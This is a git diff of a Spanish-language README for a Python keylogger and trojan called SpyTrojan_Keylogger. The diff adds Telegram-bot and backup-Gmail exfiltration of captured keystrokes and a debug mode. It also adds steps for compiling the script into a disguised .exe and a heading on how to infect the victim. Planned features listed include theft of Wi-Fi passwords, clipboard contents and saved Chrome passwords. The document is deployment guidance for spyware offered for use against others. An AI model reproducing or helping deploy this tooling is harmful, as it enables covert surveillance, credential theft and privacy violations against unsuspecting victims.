@@ -40,7 +40,7 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 - __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `reg.k`. más información [aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#envi%C3%B3-mediante-gmail).
 
   ![Correo ejemplo del Keylogger](https://i.imgur.com/HCyUK2M.png)
-
+- __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.
 - __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de teclas se envíe a varios correos a la vez.
 
     ````py
@@ -76,14 +76,15 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
     
     ![StartUp](https://i.imgur.com/xh91bR5.png)
 
-- __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.
+
+
+- __Envio mediante Bot Telegram:__ Soporte de envio automatico del registro de teclas a un bot especifico. [Más información aquí](#)
 
 
 ## Caracteristicas que se agregarán en futuras actualizaciones:  
 - __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 
 - __Conexión FTP:__ Envía el archivo `reg.k` vía FTP.
 - __Envía datos mediante FTP:__ enviará documentos, fotos y videos mediante una conexión FTP, en segundo plano.
-- __Envio mediante Bot Telegram:__ Soporte de envio automatico del registro de teclas a un bot especifico.
 - __Contraseñas de Wifi:__ Obtiene contraseñas guardadas en una laptop o PC
 - __Portapapeles:__ Obtiene el texto del portapapeles.
 - __Obtiene contraseñas guardadas en Google Chrome:__ Obtiene todas las contraseñas guardadas de Google chrome .
@@ -106,6 +107,7 @@ Requerimiento de paquetes de `Python3.8`:
 - `import datetime` <== Obtiene la Fecha, Horas, Minutos, y segundos actual
 - `import os`       <== Operaciones con archivos
 - `from winreg import *` <== Permite escribir en el registro de windows.
+- `import telebot *` <== Permite Conectarse con Telegram
 - `import time`     <== Obtiene la Fecha, Horas, Minutos, y segundos actual.
 - `import yagmail`  <== Envía `reg.k` por Gmail
 - `import socket`   <== Verifica conexión a internet
@@ -115,15 +117,15 @@ Requerimiento de paquetes de `Python3.8`:
 
 NOTA: Biblioteca no optimizada! :'( 
 
-## Escoge [GMAIL] o [DataBase]:
-- Por ahora solo podemos escoger el envío del registro o bien por una conexión a una __Base de datos__ o por __Gmail__, no podemos escoger ambas.
+## Escoge [GMAIL], [DataBase] o [Telegram]:
+- Por ahora solo podemos escoger el envío del registro o bien por una conexión a una __Base de datos__,  __Gmail__  o __BotTelegram__ no podemos escoger dos o las tres al mismo tiempo.
 
-- Buscamos la siguiente función y escogemos [1 = DataBase] o [2 = Gmail]
+- Buscamos la siguiente función y escogemos [0 = Gmail], [1 = DataBase] o  [2 = BotTelegram]
     ````py
     def GMailOrDataBase():
-    return 1    # 1 = DataBase 
-                # 0 = Gmail
-                # (en las proximas actualizaciones , ambas a la vez)
+        return 2    # 0 = Gmail
+                    # 1 = DataBase              # Solo se puede usar una opción
+                    # 2 = TelegramBot
     ```` 
 
 
@@ -236,6 +238,41 @@ def timeSend(): # Tiempo de envío perzonalizado
     ![Fin](https://i.imgur.com/axhHVlF.png)
 
 # [Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)
+
+# Modo Debugger
+Si ya configuró o bien la base de datos, Gmail o Telegram, si deseas saber si todo está Ok, pues ejecuta el archivo `Ejecuta.bat`, esta ejecutará el `SpyTrojanKeylogger.py` en modo debugg, la cual mostrará información en la consola:
+- Mensaje de Error o Exito de __[StartUp]__ 
+- Mensaje de Error o Exito de la caracteristica __`Trojan`__
+- Teclas oprimidas a tiempo real
+- Mensaje de Error o Exito al envía el registro por Gmail
+- Mensaje de Error o Exito al conectarse con la base de datos.
+- Mensaje de Error o Exito al envíar el registro mediante Telegram
+- Otros posibles errores de __`import lib`__
+
+ __[Si tiene problemas con las librerías intenta reinstalar python e instalar las librerías manualmente.]__
+
+![asd](https://i.imgur.com/1jfgC0O.png)
+
+# Convertir `*.py` a `*.exe`
+Una vez todo configurado, lo siguiente es convertir nuestro archivo `py` a un `exe`  y en el proceso disfrazarlo.
+
+- Ejecutamos el archivo:
+    
+    ![Compile.bat](https://i.imgur.com/RU12Dsy.png)
+
+    ![Compile ejecutandose](https://i.imgur.com/weGPkTn.png)
+
+- Luego de terminar aparecerá en la consola `Press any key to continue...`
+
+    ![Complile.bat terminado](https://i.imgur.com/GHBtZKI.png)
+- Regresamos a la carpeta principal y notamos que tenemos nuevas carpetas y archivos, las cuales son archivos caché sin ninguna importancia, donde e encuentrá nuestro troyano es dentro de la carpeta `EXE Final`.
+
+    ![Carpeta final](https://i.imgur.com/ljoZLXJ.png)
+
+- Compilación terminada:
+
+    ![](https://i.imgur.com/V0MI65n.png)
+
 
 # Método de infección:
 ___¿Cómo infecto a la victima?___
